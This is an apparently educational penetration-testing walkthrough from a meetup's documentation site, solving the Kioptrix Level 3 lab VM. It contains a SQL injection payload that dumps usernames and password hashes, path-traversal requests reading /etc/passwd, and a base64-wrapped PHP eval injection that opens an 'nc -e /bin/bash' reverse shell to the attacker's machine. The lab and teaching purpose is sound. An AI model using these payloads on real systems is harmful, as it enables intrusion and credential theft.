

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta content="default-src 'none'; script-src 'self' https://cdnjs.cloudflare.com 'unsafe-inline'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self'" http-equiv="Content-Security-Policy" />
<meta content="nosniff" http-equiv="X-Content-Type-Options" />
<meta content="deny" http-equiv="X-Frame-Options" />
<meta content="1; mode=block" http-equiv="X-XSS-Protection" />
<meta content="strict-origin" http-equiv="Referrer-Policy" />
<meta content="max-age=31536000; includeSubDomains" http-equiv="Strict-Transport-Security" />
<meta content="'*'" http-equiv="Access-Control-Allow-Origin" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>3.12. Kioptrix Level 3 &mdash; South Bay WASP 1.0.3 documentation</title>
  

  
  
  
  

  

  
  
    

  

  
    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
  <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
    <link rel="index" title="Index" href="../genindex.html" />
    <link rel="search" title="Search" href="../search.html" />
    <link rel="next" title="3.13. Kioptrix Level 2" href="kioptrix2.html" />
    <link rel="prev" title="3.11. Kioptrix Level 4" href="kioptrix4.html" /> 

  
  <script src="../_static/js/modernizr.min.js"></script>

</head>

<body class="wy-body-for-nav">

   
  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search">
          

          
            <a href="../index.html" class="icon icon-home"> South Bay WASP
          

          
          </a>

          
            
            
              <div class="version">
                1.0
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption"><span class="caption-text">Table of Contents</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="VWADP.html">3.1. Finding and running challenges</a></li>
<li class="toctree-l2"><a class="reference internal" href="owlnest.html">3.2. OwlNest</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice6.html">3.3. De-ICE Level 6</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice5.html">3.4. De-ICE Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice4.html">3.5. De-ICE Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice3.html">3.6. De-ICE Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice2.html">3.7. De-ICE Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice1.html">3.8. De-ICE Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="underdist3.html">3.9. Underdist: 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix5.html">3.10. Kioptrix Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix4.html">3.11. Kioptrix Level 4</a></li>
<li class="toctree-l2 current"><a class="current reference internal" href="#">3.12. Kioptrix Level 3</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#setup">3.12.1. Setup</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#setting-up-the-vmware-vm">3.12.1.1. Setting up the VMware VM</a></li>
<li class="toctree-l4"><a class="reference internal" href="#setting-up-your-environment">3.12.1.2. Setting up your environment</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#reconnaisance">3.12.2. Reconnaisance</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#network-reconnaissance">3.12.2.1. Network reconnaissance</a></li>
<li class="toctree-l4"><a class="reference internal" href="#port-80-reconnaissance-via-dirb-nikto">3.12.2.2. Port 80 reconnaissance via dirb &amp; nikto</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#viewing-the-web-site">3.12.3. Viewing the web site</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#gallarific-sql-injection-exploit">3.12.3.1. Gallarific SQL injection exploit</a></li>
<li class="toctree-l4"><a class="reference internal" href="#lotuscms-gets-arbitrary-php-execution-file-download-upload-reverse-shell">3.12.3.2. LotusCMS gets arbitrary PHP execution = file download/upload, reverse shell</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#the-exploit">3.12.4. The Exploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#exploiting-the-gallarific-sql-injection">3.12.4.1. Exploiting the Gallarific SQL injection</a></li>
<li class="toctree-l4"><a class="reference internal" href="#shell-access-to-root">3.12.4.2. Shell access to root</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix2.html">3.13. Kioptrix Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix1.html">3.14. Kioptrix Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="security_shepherd.html">3.15. Security Shepherd Web App Levels</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix2.html">3.16. Holynix2</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix1.html">3.17. Holynix1</a></li>
<li class="toctree-l2"><a class="reference internal" href="freshly.html">3.18. Freshly</a></li>
<li class="toctree-l2"><a class="reference internal" href="zorz.html">3.19. ZorZ</a></li>
<li class="toctree-l2"><a class="reference internal" href="vulnix.html">3.20. Vulnix</a></li>
<li class="toctree-l2"><a class="reference internal" href="googles_xss_game.html">3.21. Google’s XSS Game</a></li>
<li class="toctree-l2"><a class="reference internal" href="owning_database_with_sqlmap.html">3.22. Owning the Database with SQLMap</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell_II.html">3.23. PentesterLab From SQL injection to Shell II</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell.html">3.24. PentesterLab From SQL injection to Shell</a></li>
<li class="toctree-l2"><a class="reference internal" href="skytower1.html">3.25. SkyTower1</a></li>
<li class="toctree-l2"><a class="reference internal" href="nebula.html">3.26. Exploit Exercises Nebula</a></li>
<li class="toctree-l2"><a class="reference internal" href="natas.html">3.27. Natas</a></li>
<li class="toctree-l2"><a class="reference internal" href="try2hack.nl.html">3.28. try2hack.nl</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">South Bay WASP</a>
        
      </nav>


      <div class="wy-nav-content">
        
        <div class="rst-content">
        
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../index.html">Docs</a> &raquo;</li>
        
          <li><a href="../pentest_challenges.html">3. Pentest Challenges</a> &raquo;</li>
        
      <li>3.12. Kioptrix Level 3</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="../_sources/challenges/kioptrix3.rst.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="kioptrix-level-3">
<span id="kioptrix3"></span><h1>3.12. Kioptrix Level 3<a class="headerlink" href="#kioptrix-level-3" title="Permalink to this headline">¶</a></h1>
<div class="section" id="setup">
<h2>3.12.1. Setup<a class="headerlink" href="#setup" title="Permalink to this headline">¶</a></h2>
<div class="section" id="setting-up-the-vmware-vm">
<h3>3.12.1.1. Setting up the VMware VM<a class="headerlink" href="#setting-up-the-vmware-vm" title="Permalink to this headline">¶</a></h3>
<p>The challenge is <a class="reference external" href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/">Kioptrix: Level 1.2 (#3)</a>, the third of the <a class="reference external" href="https://www.vulnhub.com/series/kioptrix,8/">Vulnhub Kioptrix Series</a>. The VM comes packaged as <a class="reference external" href="http://www.kioptrix.com/dlvm/KVM3.rar">KVM3.rar</a>, which is a rar archive containing a VMware vmdk file. If you have any setup troubles you can add the disk to an existing Linux VM, mount it, make a copy of <code class="file docutils literal notranslate"><span class="pre">/etc/shadow</span></code>, and delete the root password hash. This will provide passwordless root access to fix any issues. See <a class="reference internal" href="VWADP.html#vmsetup"><span class="std std-ref">Traditional VM challenge setup</span></a> for background on using the VMware vmdk file. Kioptrix3 runs Ubuntu 8.04.3 LTS i686.</p>
</div>
<div class="section" id="setting-up-your-environment">
<h3>3.12.1.2. Setting up your environment<a class="headerlink" href="#setting-up-your-environment" title="Permalink to this headline">¶</a></h3>
<p>If you want to easily cut-and-paste from the sample code below, download <a class="reference download internal" href="../_downloads/kioptrix3_setup.sh" download=""><code class="xref download docutils literal notranslate"><span class="pre">kioptrix3_setup.sh</span></code></a>:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix3
mkdir -p <span class="nv">$PT</span>
<span class="nb">cd</span> <span class="nv">$PT</span>
<span class="c1"># download kioptrix3_setup.sh</span>
curl --silent --remote-name https://pentest-meetup.appspot.com/html/_downloads/kioptrix3_setup.sh
<span class="c1"># edit as needed; later the recon will give you TARGET IP</span>
<span class="nb">source</span> kioptrix3_setup.sh
</pre></div>
</div>
</div>
</div>
<div class="section" id="reconnaisance">
<h2>3.12.2. Reconnaisance<a class="headerlink" href="#reconnaisance" title="Permalink to this headline">¶</a></h2>
<div class="section" id="network-reconnaissance">
<h3>3.12.2.1. Network reconnaissance<a class="headerlink" href="#network-reconnaissance" title="Permalink to this headline">¶</a></h3>
<p>Start with some standard network reconnaissance looking for the vulnerable host:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix3
<span class="nb">source</span> <span class="nv">$PT</span>/kioptrix3_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/nmap
<span class="nv">$SUDO</span> nmap -sn -PE -oA nmap_sn <span class="nv">$SUBNET</span>
<span class="nv">$SUDO</span> chown <span class="nv">$USER</span>.<span class="nv">$USER</span> nmap_sn.*
<span class="c1"># use the grep-able output to get a list of target hosts</span>
grep Up nmap_sn.gnmap <span class="p">|</span> cut -d<span class="s2">&quot; &quot;</span> -f2 &gt; <span class="nv">$TARGETS</span>
<span class="c1"># use the xml output to get an html report</span>
xsltproc nmap_sn.xml -o nmap_sn.html
</pre></div>
</div>
<p>Here we know $TARGET and can fill it in $PT/kioptrix3_setup.sh and also edit <code class="file docutils literal notranslate"><span class="pre">/etc/hosts</span></code> to add “kioptrix3.com” (<code class="docutils literal notranslate"><span class="pre">echo</span> <span class="pre">&quot;$TARGET</span> <span class="pre">kioptrix3.com&quot;</span> <span class="pre">|</span> <span class="pre">$SUDO</span> <span class="pre">tee</span> <span class="pre">-a</span> <span class="pre">/etc/hosts</span></code>).</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">$SUDO</span> nmap -A -vv -T3 --max-retries <span class="m">5</span> -Pn -oA nmap_A <span class="nv">$TARGET</span>
<span class="nv">$SUDO</span> chown <span class="nv">$USER</span>.<span class="nv">$USER</span> nmap_A.*
xsltproc nmap_A.xml -o nmap_A.html
</pre></div>
</div>
<p>Running this gives reveals:</p>
<ul>
<li><p class="first">port 22: OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</p>
</li>
<li><p class="first">port 80: Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</p>
<p>A quick search for PHP/5.2.4-2ubuntu5.6 indicates the target is Ubuntu Hardy (8.04).</p>
</li>
</ul>
</div>
<div class="section" id="port-80-reconnaissance-via-dirb-nikto">
<h3>3.12.2.2. Port 80 reconnaissance via dirb &amp; nikto<a class="headerlink" href="#port-80-reconnaissance-via-dirb-nikto" title="Permalink to this headline">¶</a></h3>
<p>Out of habit we do <strong class="program">dirb</strong> and <strong class="program">nikto</strong> scans:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix3
<span class="nb">source</span> <span class="nv">$PT</span>/kioptrix3_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/spider
dirb  http://<span class="nv">$HOST</span>/ -o dirb.txt
nikto -output nikto.html -C all -host <span class="nv">$HOST</span> -port <span class="m">80</span>
</pre></div>
</div>
<p>The most significant finding was finding phpmyadmin, indicating the MySQL database.</p>
</div>
</div>
<div class="section" id="viewing-the-web-site">
<h2>3.12.3. Viewing the web site<a class="headerlink" href="#viewing-the-web-site" title="Permalink to this headline">¶</a></h2>
<p>The next bit of reconnaissance was to view the web site. Two significant findings are detailed here, with only an exploit for the first provided.</p>
<div class="section" id="gallarific-sql-injection-exploit">
<h3>3.12.3.1. Gallarific SQL injection exploit<a class="headerlink" href="#gallarific-sql-injection-exploit" title="Permalink to this headline">¶</a></h3>
<div class="section" id="finding-gallarific">
<h4>3.12.3.1.1. Finding Gallarific<a class="headerlink" href="#finding-gallarific" title="Permalink to this headline">¶</a></h4>
<p>The home page brags about the new <a class="reference external" href="http://kioptrix3.com/gallery/">gallery</a> system provided. Looking at the tab on the gallery web page you’ll see “Gallarific”.</p>
</div>
<div class="section" id="gallarific-exploit-candidate">
<h4>3.12.3.1.2. Gallarific exploit candidate<a class="headerlink" href="#gallarific-exploit-candidate" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://www.exploit-db.com/search/?action=search&amp;text=gallarific&amp;e_author=">Search Gallarific in Exploit Database</a> returns <a class="reference external" href="https://www.exploit-db.com/exploits/15891/">GALLARIFIC PHP Photo Gallery Script (gallery.php) SQL Injection</a>. (<code class="docutils literal notranslate"><span class="pre">searchsploit</span> <span class="pre">gallarific</span></code> also returns the SQL injection.)</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">===[ Exploit ]===</span>
<span class="go">www.site.com/gallery.php?id=null[Sql Injection]</span>

<span class="go">www.site.com/gallery.php?id=null+and+1=2+union+select+1,group_concat(userid,0x3a,username,0x3a,password),3,4,5,6,7,8+from+gallarific_users--</span>
</pre></div>
</div>
<p>Since the gallery is at <a class="reference external" href="http://kioptrix3.com/gallery/">http://kioptrix3.com/gallery/</a> the injection point is <a class="reference external" href="http://kioptrix3.com/gallery/gallery.php?id=null">http://kioptrix3.com/gallery/gallery.php?id=null</a>. To help understand how the SQL injection occurs, here is the actual PHP query:</p>
<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="x">$parent_id = $_GET[&#39;id&#39;];</span>
<span class="x">$selcat=&quot;SELECT * from gallarific_galleries where parentid=$parent_id order by parentid,sort,name&quot;;</span>
<span class="x">$selcat2=mysql_query($selcat) or die(mysql_error().&quot;Could not select category&quot;);</span>
</pre></div>
</div>
<p>By setting <code class="docutils literal notranslate"><span class="pre">id</span></code> to:</p>
<div class="highlight-mysql notranslate"><div class="highlight"><pre><span></span><span class="no">null</span> <span class="k">and</span> <span class="mi">1</span><span class="o">=</span><span class="mi">2</span>
<span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="nf">group_concat</span><span class="p">(</span><span class="n">userid</span><span class="p">,</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,</span><span class="n">username</span><span class="p">,</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,</span><span class="n">password</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">8</span>
  <span class="k">from</span> <span class="n">gallarific_users</span>
<span class="c1">--</span>
</pre></div>
</div>
<p>the query becomes</p>
<div class="highlight-mysql notranslate"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">from</span> <span class="n">gallarific_galleries</span> <span class="k">where</span> <span class="n">parentid</span><span class="o">=</span><span class="no">null</span> <span class="k">and</span> <span class="mi">1</span><span class="o">=</span><span class="mi">2</span>
<span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="nf">group_concat</span><span class="p">(</span><span class="n">userid</span><span class="p">,</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,</span><span class="n">username</span><span class="p">,</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,</span><span class="n">password</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">8</span>
  <span class="k">from</span> <span class="n">gallarific_users</span>
<span class="c1">-- order by parentid,sort,name</span>
</pre></div>
</div>
<p>The first SELECT returns nothing due to “1=2” always being false; the union is any arbitrary query returning (in this case) 8 columns; and the trailing “–” on the id value comments out the original “order by parentid,sort,name”. So the sql query has effectively been hijacked into an arbitrary query. <strong class="program">sqlmap</strong> can automate this for you, allowing mapping the complete database that the application has access to.</p>
</div>
</div>
<div class="section" id="lotuscms-gets-arbitrary-php-execution-file-download-upload-reverse-shell">
<h3>3.12.3.2. LotusCMS gets arbitrary PHP execution = file download/upload, reverse shell<a class="headerlink" href="#lotuscms-gets-arbitrary-php-execution-file-download-upload-reverse-shell" title="Permalink to this headline">¶</a></h3>
<p>If you just want the exploit then feel free to skip on ahead. This is included only for those wishing to study in depth, including reverse shells.</p>
<div class="section" id="finding-lotuscms">
<h4>3.12.3.2.1. Finding LotusCMS<a class="headerlink" href="#finding-lotuscms" title="Permalink to this headline">¶</a></h4>
<p>Visiting the website reveals a number of pages including a LotusCMS login page:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix3/spider$</span> curl --silent http://kioptrix3.com/index.php?system<span class="o">=</span>Admin
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">  &lt;title&gt;LotusCMS Administration&lt;/title&gt;</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">  Proudly Powered by: &lt;a href=&quot;http://www.lotuscms.org&quot;&gt;LotusCMS&lt;/a&gt;&lt;/li&gt;</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
</pre></div>
</div>
</div>
<div class="section" id="the-problem-with-lotuscms-s-router-php">
<h4>3.12.3.2.2. The problem with LotusCMS’s router.php<a class="headerlink" href="#the-problem-with-lotuscms-s-router-php" title="Permalink to this headline">¶</a></h4>
<div class="section" id="router-php-code">
<h5>3.12.3.2.2.1. router.php code<a class="headerlink" href="#router-php-code" title="Permalink to this headline">¶</a></h5>
<p>We’re going to go out of order here and show the problem code before we discover the vulnerabilities. This hopefully will help you understand them when we get to then next. Here is the code for <code class="file docutils literal notranslate"><span class="pre">core/lib/router.php</span></code> showing the unmodified, unchecked user inputs <code class="docutils literal notranslate"><span class="pre">$plugin</span></code> and <code class="docutils literal notranslate"><span class="pre">$page</span></code> are concatenated in an <code class="docutils literal notranslate"><span class="pre">include</span></code> and <code class="docutils literal notranslate"><span class="pre">eval</span></code> statment:</p>
<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="x">class Router{</span>
</span>
<span class="x">        /**</span>
<span class="x">         * This routes any request from get variables into the LotusCMS system.</span>
<span class="x">         */</span>
<span class="x">        public function Router(){</span>
<span class="x">                //Get page request (if any)</span>
<span class="hll"><span class="x">                $page = $this-&gt;getInputString(&quot;page&quot;, &quot;index&quot;);</span>
</span>
<span class="x">                //Get plugin request (if any)</span>
<span class="hll"><span class="x">                $plugin = $this-&gt;getInputString(&quot;system&quot;, &quot;Page&quot;);</span>
</span>
<span class="x">                //If there is a request for a plugin</span>
<span class="hll"><span class="x">                if(file_exists(&quot;core/plugs/&quot;.$plugin.&quot;Starter.php&quot;)){</span>
</span><span class="x">                        //Include Page fetcher</span>
<span class="hll"><span class="x">                        include(&quot;core/plugs/&quot;.$plugin.&quot;Starter.php&quot;);</span>
</span>
<span class="x">                        //Fetch the page and get over loading cache etc...</span>
<span class="hll"><span class="x">                        eval(&quot;new &quot;.$plugin.&quot;Starter(&#39;&quot;.$page.&quot;&#39;);&quot;);</span>
</span></pre></div>
</div>
</div>
<div class="section" id="router-php-downloading-files">
<h5>3.12.3.2.2.2. router.php downloading files<a class="headerlink" href="#router-php-downloading-files" title="Permalink to this headline">¶</a></h5>
<p>Imagine the following query:</p>
<blockquote>
<div><a class="reference external" href="http://kioptrix3.com/index.php?system=../../../../../../../../../../etc/passwd%00.html">http://kioptrix3.com/index.php?system=../../../../../../../../../../etc/passwd%00.html</a></div></blockquote>
<p><code class="docutils literal notranslate"><span class="pre">$page</span></code> defaults to “index”; <code class="docutils literal notranslate"><span class="pre">$plugin</span></code> is set to the <code class="docutils literal notranslate"><span class="pre">system</span></code> parameter above; the <code class="docutils literal notranslate"><span class="pre">file_exists</span></code> test succeeds because the <code class="docutils literal notranslate"><span class="pre">system</span></code> value has an embedded null byte (“%00”) (but the “.html” is needed to let PHP know to display the file); the <code class="docutils literal notranslate"><span class="pre">include</span></code> includes the file <code class="file docutils literal notranslate"><span class="pre">/etc/passwd</span></code>; and the <code class="docutils literal notranslate"><span class="pre">eval</span></code> errors out and leaves a mess after <code class="file docutils literal notranslate"><span class="pre">/etc/passwd</span></code>. And so we’ve downloaded the file plus a little garbage to clean out.</p>
</div>
<div class="section" id="router-php-executing-arbitrary-php">
<h5>3.12.3.2.2.3. router.php executing arbitrary PHP<a class="headerlink" href="#router-php-executing-arbitrary-php" title="Permalink to this headline">¶</a></h5>
<p>Imagine the following query:</p>
<blockquote>
<div><a class="reference external" href="http://kioptrix3.com/index.php?page=index">http://kioptrix3.com/index.php?page=index</a>’);eval(base64_decode(…));#</div></blockquote>
<p><code class="docutils literal notranslate"><span class="pre">$page</span></code> above is set to the <code class="docutils literal notranslate"><span class="pre">page</span></code> parameter; <code class="docutils literal notranslate"><span class="pre">$plugin</span></code> defaults to “Page”; the <code class="docutils literal notranslate"><span class="pre">file_exists</span></code> test succeeds with the “Page” plugin; the “Page” plugin is included; and finally the <code class="docutils literal notranslate"><span class="pre">eval</span></code> line runs. It looks like this:</p>
<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="x">eval(&quot;new &quot;.$plugin.&quot;Starter(&#39;&quot;.$page.&quot;&#39;);&quot;);</span>
<span class="x"># substituting &quot;Page&quot; for $plugin, long string for $page we get</span>
<span class="x">eval(&quot;new &quot;.&quot;Page&quot;.&quot;Starter(&#39;&quot;.&quot;index&#39;);eval(base64_decode(...));#&quot;.&quot;&#39;);&quot;);</span>
<span class="x"># concatenating strings we get</span>
<span class="x">eval(&quot;new Page.Starter(&#39;index&#39;);eval(base64_decode(...));#&#39;);&quot;);</span>
<span class="x"># what&#39;s eval&#39;ed is (the # comments out the trailing &quot;&#39;);&quot; to prevent an error)</span>
<span class="x">new Page.Starter(&#39;index&#39;);eval(base64_decode(...));#&#39;);</span>
</pre></div>
</div>
<p>Since … can be any base64-encoded PHP, arbitrary PHP code can be run.</p>
</div>
</div>
<div class="section" id="lotuscms-exploit-candidates">
<h4>3.12.3.2.3. LotusCMS exploit candidates<a class="headerlink" href="#lotuscms-exploit-candidates" title="Permalink to this headline">¶</a></h4>
<p>Now we pick up with how we discovered the vulnerabilities. The web page for LotusCMS is found at <a class="reference external" href="https://github.com/kevinbluett/LotusCMS-Content-Management-System">kevinbluett/LotusCMS-Content-Management-System</a>. <a class="reference external" href="https://www.exploit-db.com/search/?action=search&amp;text=lotuscms&amp;e_author=">Search LotusCMS in Exploit Database</a> returns these exploits:</p>
<ul>
<li><p class="first"><a class="reference external" href="https://www.exploit-db.com/exploits/16982/">lotuscms 3.0.3 - Multiple Vulnerabilities</a> include a number of XSS vulnerabilities. We won’t pursue those now.</p>
</li>
<li><p class="first"><a class="reference external" href="https://www.exploit-db.com/exploits/15964/">Lotus CMS Fraise 3.0 - LFI - Remote Code Execution Exploit</a></p>
<p>This one is interesting but flawed. The “testFileInclusion” function tries <a class="reference external" href="http://kioptrix3.com/index.php?system=../../../../../../../../../../etc/passwd%00">http://kioptrix3.com/index.php?system=../../../../../../../../../../etc/passwd%00</a> but that’s missing a trailing extension (“.html”). After fixing that the remote shell fails so it needs more work; for now we’ll keep the exploit in mind if other exploits fail. But it does demonstrate that we can look at any file on the system accessible to the web server:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">FULLPATH=/etc/passwd</span>
<span class="go">FILENAME=${FULLPATH##*/}</span>
<span class="go">curl --silent \</span>
<span class="go">  http://kioptrix3.com/index.php?system=../../../../../../../../../..$FULLPATH%00.html | \</span>
<span class="go">  sed -e &#39;/^&lt;br \/&gt;/q&#39; | head -n -1 &gt; $FILENAME</span>
</pre></div>
</div>
<p>Keep in mind that this file inclusion vulnerability allows executing any php files you might be able to upload.</p>
</li>
<li><p class="first"><a class="reference external" href="https://www.exploit-db.com/exploits/18565/">LotusCMS 3.0 eval() Remote Command Execution</a> is a metasploit exploit we’ll pursue.</p>
<div class="highlight-ruby notranslate"><div class="highlight"><pre><span></span><span class="s1">&#39;Description&#39;</span>    <span class="o">=&gt;</span> <span class="sx">%q{</span>
<span class="sx">        This module exploits a vulnerability found in Lotus CMS 3.0&#39;s Router()</span>
<span class="sx">    function.  This is done by embedding PHP code in the &#39;page&#39; parameter,</span>
<span class="sx">    which will be passed to a eval call, therefore allowing remote code execution.</span>

<span class="sx">        The module can either automatically pick up a &#39;page&#39; parameter from the</span>
<span class="sx">    default page, or manually specify one in the URI option.  To use the automatic</span>
<span class="sx">    method, please supply the URI with just a directory path, for example: &quot;/lcms/&quot;.</span>
<span class="sx">    To manually configure one, you may do: &quot;/lcms/somepath/index.php?page=index&quot;</span>
<span class="sx">}</span><span class="p">,</span>
</pre></div>
</div>
</li>
</ul>
<div class="section" id="executing-arbitrary-php-simple-reverse-shell">
<h5>3.12.3.2.3.1. Executing arbitrary PHP - simple reverse shell<a class="headerlink" href="#executing-arbitrary-php-simple-reverse-shell" title="Permalink to this headline">¶</a></h5>
<p>Let’s explore this last vulnerability a bit more. If you investigate the metasploit exploit you’ll see you can execute arbitrary PHP code very simply:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Get base64 encoded PHP code - here a reverse shell</span>
<span class="c1">#   Reverse shell assumes &quot;socat - TCP-LISTEN:$PORT&quot; on Kali</span>
<span class="nv">CMD</span><span class="o">=</span><span class="s1">&#39;passthru(&quot;nc -e /bin/bash &#39;</span><span class="s2">&quot;</span><span class="nv">$KALI</span><span class="s2"> </span><span class="nv">$PORT</span><span class="s2">&quot;</span><span class="s1">&#39;&quot;);&#39;</span>
<span class="nv">CMD64</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&quot;</span><span class="nv">$CMD</span><span class="s2">&quot;</span> <span class="p">|</span> base64 -w <span class="m">0</span><span class="k">)</span>
<span class="nb">echo</span> -n <span class="nv">$CMD64</span> <span class="p">|</span> base64 -d
<span class="c1"># PAGE=index&#39;);eval(base64_decode(...));#</span>
<span class="nv">PAGE</span><span class="o">=</span><span class="s2">&quot;index&#39;&quot;</span><span class="s1">&#39;);eval(base64_decode(&quot;&#39;</span><span class="nv">$CMD64</span><span class="s1">&#39;&quot;));#&#39;</span>
curl -v http://kioptrix3.com/index.php <span class="se">\</span>
  --data-urlencode <span class="nv">page</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$PAGE</span><span class="s2">&quot;</span>
<span class="c1"># First thing in reverse shell</span>
<span class="c1"># python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
</pre></div>
</div>
<p>Also note that the resulting terminal is dumb.</p>
</div>
<div class="section" id="executing-arbitrary-php-reverse-shell-with-pty">
<h5>3.12.3.2.3.2. Executing arbitrary PHP - reverse shell with pty<a class="headerlink" href="#executing-arbitrary-php-reverse-shell-with-pty" title="Permalink to this headline">¶</a></h5>
